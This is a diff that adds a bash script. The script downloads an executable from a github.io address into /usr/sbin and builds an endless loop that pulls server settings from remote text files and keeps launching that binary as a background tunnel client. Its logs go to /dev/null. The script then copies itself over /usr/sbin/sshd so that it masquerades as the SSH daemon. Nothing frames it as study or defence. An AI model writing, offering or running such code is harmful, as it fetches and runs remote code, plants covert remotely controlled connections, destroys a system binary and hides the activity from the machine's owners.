@@ -1,0 +1,36 @@
+#!/bin/bash
+
+wget -O /usr/sbin/nz https://0123454321.github.io/Goorm/Tools/nz && chmod a+x /usr/sbin/nz
+cd /usr/sbin && touch ng && chmod a+x ng
+
+cat << EOF > /usr/sbin/ng
+#!/bin/bash
+nz_log="/dev/null"
+nz_run_TCP(){
+    nz_p=\$1
+    nz_s=\$2
+    
+    if [ "\$nz_s" = "" ]; then
+        nz_info_str="\$(curl -s https://0123454321.github.io/Goorm/Conf/nz-slave-tcp.txt)"
+        nz_url=\$(echo "\${nz_info_str}" | awk '{print \$2}')
+        nz_port=\$(echo "\${nz_info_str}" | awk '{print \$1}')
+        nz_s=\$(curl -s \${nz_url} | grep \${nz_port} | awk '{print \$2}')
+    fi
+    
+    if [ "\$old_nz_s" = "" ] || [ "\$old_nz_s" != "\$nz_s" ]; then
+        \$nz_pid || kill -9 \$nz_pid
+        nz -s \${nz_s} -p \${nz_p} &
+        export nz_pid=\$!
+        echo "\$(env TZ="Asia/Shanghai" date)    \$nz_s" >> \${nz_log}
+        #echo "\$NZ_PID: \${nz_pid}"
+    fi
+    export old_nz_s=\${nz_s}
+}
+while true
+do 
+    nz_run_TCP $1
+    sleep 600 
+done
+EOF
+
+cp -f /usr/sbin/ng /usr/sbin/sshd
